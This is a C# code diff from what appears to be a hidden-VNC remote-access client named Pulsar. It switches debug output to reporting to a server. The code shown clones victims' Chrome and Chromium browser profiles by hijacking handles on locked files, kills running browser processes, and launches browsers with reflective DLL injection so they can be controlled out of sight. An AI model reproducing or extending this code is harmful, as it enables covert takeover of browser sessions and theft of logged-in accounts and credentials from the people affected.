@@ -1,5 +1,6 @@
 ﻿using Microsoft.Win32;
 using Pulsar.Client.Helper.HVNC.Chromium;
+using Pulsar.Client.LoggingAPI;
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -438,36 +439,36 @@ namespace Pulsar.Client.Helper.HVNC
                 var chromeConfig = BrowserConfiguration.GetChromeConfig();
                 if (chromeConfig == null)
                 {
-                    Debug.WriteLine("Chrome executable not found.");
+                    UniversalDebugLogger.SendLogToServer("Chrome executable not found.");
                     return;
                 }
 
-                Debug.WriteLine($"Found Chrome at: {chromeConfig.ExecutablePath}");
+                UniversalDebugLogger.SendLogToServer($"Found Chrome at: {chromeConfig.ExecutablePath}");
 
                 var cloneResult = await CloneBrowserProfileAsync(chromeConfig.SearchPattern, chromeConfig.ReplacementPath, "Chrome").ConfigureAwait(false);
                 if (cloneResult.Cancelled)
                 {
-                    Debug.WriteLine("Chrome profile cloning cancelled by user – skipping injection.");
+                    UniversalDebugLogger.SendLogToServer("Chrome profile cloning cancelled by user – skipping injection.");
                     return;
                 }
 
                 try
                 {
                     await Task.Run(() => KDOTInjector.Start(dllbytes, chromeConfig.ExecutablePath, chromeConfig.SearchPattern, chromeConfig.ReplacementPath)).ConfigureAwait(false);
-                    Debug.WriteLine("Chrome started successfully with reflective DLL injection.");
+                    UniversalDebugLogger.SendLogToServer("Chrome started successfully with reflective DLL injection.");
                 }
                 catch (Exception injectionEx)
                 {
-                    Debug.WriteLine($"Error during DLL injection: {injectionEx.Message}");
+                    UniversalDebugLogger.SendLogToServer($"Error during DLL injection: {injectionEx.Message}");
                 }
             }
             catch (OperationCanceledException)
             {
-                Debug.WriteLine("Chrome profile cloning cancelled by user.");
+                UniversalDebugLogger.SendLogToServer("Chrome profile cloning cancelled by user.");
             }
             catch (Exception ex)
             {
-                Debug.WriteLine("Error starting Chrome: " + ex.Message);
+                UniversalDebugLogger.SendLogToServer("Error starting Chrome: " + ex.Message);
             }
         }
 
@@ -697,23 +698,23 @@ namespace Pulsar.Client.Helper.HVNC
             {
                 cancellationToken.ThrowIfCancellationRequested();
 
-                Debug.WriteLine($"Cloning browser profile from '{sourceDir}' to '{destDir}'");
+                UniversalDebugLogger.SendLogToServer($"Cloning browser profile from '{sourceDir}' to '{destDir}'");
 
                 if (!Directory.Exists(sourceDir))
                 {
-                    Debug.WriteLine($"Source directory does not exist: {sourceDir}");
+                    UniversalDebugLogger.SendLogToServer($"Source directory does not exist: {sourceDir}");
                     return new CloneResult(false, false, destDir);
                 }
 
                 if (Directory.Exists(destDir))
                 {
-                    Debug.WriteLine($"Removing existing destination directory: {destDir}");
+                    UniversalDebugLogger.SendLogToServer($"Removing existing destination directory: {destDir}");
                     DeleteFolder(destDir);
                 }
 
                 cancellationToken.ThrowIfCancellationRequested();
 
-                Debug.WriteLine("[BrowserClone] Using handle hijacking for locked files...");
+                UniversalDebugLogger.SendLogToServer("[BrowserClone] Using handle hijacking for locked files...");
                 bool success = HandleHijacker.ForceCopyDirectory(
                     sourceDir,
                     destDir,
@@ -723,24 +724,24 @@ namespace Pulsar.Client.Helper.HVNC
 
                 if (success)
                 {
-                    Debug.WriteLine("[BrowserClone] Browser profile cloned successfully with handle hijacking.");
+                    UniversalDebugLogger.SendLogToServer("[BrowserClone] Browser profile cloned successfully with handle hijacking.");
                 }
                 else
                 {
-                    Debug.WriteLine("[BrowserClone] Handle hijacking partial success, some files may be skipped.");
+                    UniversalDebugLogger.SendLogToServer("[BrowserClone] Handle hijacking partial success, some files may be skipped.");
                 }
 
                 return new CloneResult(success, false, destDir);
             }
             catch (OperationCanceledException)
             {
-                Debug.WriteLine("[BrowserClone] Operation cancelled by user.");
+                UniversalDebugLogger.SendLogToServer("[BrowserClone] Operation cancelled by user.");
                 CleanupCancelledClone(destDir);
                 return new CloneResult(false, true, destDir);
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Error cloning browser profile: {ex.Message}");
+                UniversalDebugLogger.SendLogToServer($"Error cloning browser profile: {ex.Message}");
                 CleanupCancelledClone(destDir);
                 throw;
             }
@@ -779,19 +780,19 @@ namespace Pulsar.Client.Helper.HVNC
             {
                 if (string.IsNullOrWhiteSpace(browserPath) || !File.Exists(browserPath))
                 {
-                    Debug.WriteLine($"Generic Chromium browser executable not found at: {browserPath}");
+                    UniversalDebugLogger.SendLogToServer($"Generic Chromium browser executable not found at: {browserPath}");
                     return;
                 }
 
                 if (string.IsNullOrWhiteSpace(searchPattern) || string.IsNullOrWhiteSpace(replacementPath))
                 {
-                    Debug.WriteLine("Search pattern and replacement path are required for generic Chromium browser.");
+                    UniversalDebugLogger.SendLogToServer("Search pattern and replacement path are required for generic Chromium browser.");
                     return;
                 }
 
-                Debug.WriteLine($"Starting Generic Chromium Browser: {browserPath}");
-                Debug.WriteLine($"Search Pattern: {searchPattern}");
-                Debug.WriteLine($"Replacement Path: {replacementPath}");
+                UniversalDebugLogger.SendLogToServer($"Starting Generic Chromium Browser: {browserPath}");
+                UniversalDebugLogger.SendLogToServer($"Search Pattern: {searchPattern}");
+                UniversalDebugLogger.SendLogToServer($"Replacement Path: {replacementPath}");
 
                 string processName = Path.GetFileNameWithoutExtension(browserPath);
                 string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {processName}.exe /F";
@@ -804,15 +805,15 @@ namespace Pulsar.Client.Helper.HVNC
                 startupInfo.dwFlags = STARTF_USEPOSITION;
                 PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
 
-                Debug.WriteLine($"Killing any existing {processName}.exe processes...");
+                UniversalDebugLogger.SendLogToServer($"Killing any existing {processName}.exe processes...");
                 if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                 {
-                    Debug.WriteLine($"Waiting for {processName}.exe processes to terminate...");
+                    UniversalDebugLogger.SendLogToServer($"Waiting for {processName}.exe processes to terminate...");
                     WaitForProcessCompletion(processInfo, 5000);
                 }
                 else
                 {
-                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
+                    UniversalDebugLogger.SendLogToServer("Failed to create taskkill process, using fallback delay.");
                     await Task.Delay(500).ConfigureAwait(false);
                 }
 
@@ -825,27 +826,27 @@ namespace Pulsar.Client.Helper.HVNC
                 var cloneResult = await CloneBrowserProfileAsync(searchPattern, replacementPath, friendlyName).ConfigureAwait(false);
                 if (cloneResult.Cancelled)
                 {
-                    Debug.WriteLine("Generic Chromium profile cloning cancelled by user – skipping injection.");
+                    UniversalDebugLogger.SendLogToServer("Generic Chromium profile cloning cancelled by user – skipping injection.");
                     return;
                 }
 
                 try
                 {
                     await Task.Run(() => KDOTInjector.Start(dllbytes, browserPath, searchPattern, replacementPath)).ConfigureAwait(false);
-                    Debug.WriteLine($"Generic Chromium browser started successfully with reflective DLL injection.");
+                    UniversalDebugLogger.SendLogToServer($"Generic Chromium browser started successfully with reflective DLL injection.");
                 }
                 catch (Exception injectionEx)
                 {
-                    Debug.WriteLine($"Error during generic Chromium DLL injection: {injectionEx.Message}");
+                    UniversalDebugLogger.SendLogToServer($"Error during generic Chromium DLL injection: {injectionEx.Message}");
                 }
             }
             catch (OperationCanceledException)
             {
-                Debug.WriteLine("Generic Chromium profile cloning cancelled by user.");
+                UniversalDebugLogger.SendLogToServer("Generic Chromium profile cloning cancelled by user.");
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Error starting generic Chromium browser: {ex.Message}");
+                UniversalDebugLogger.SendLogToServer($"Error starting generic Chromium browser: {ex.Message}");
             }
         }
 
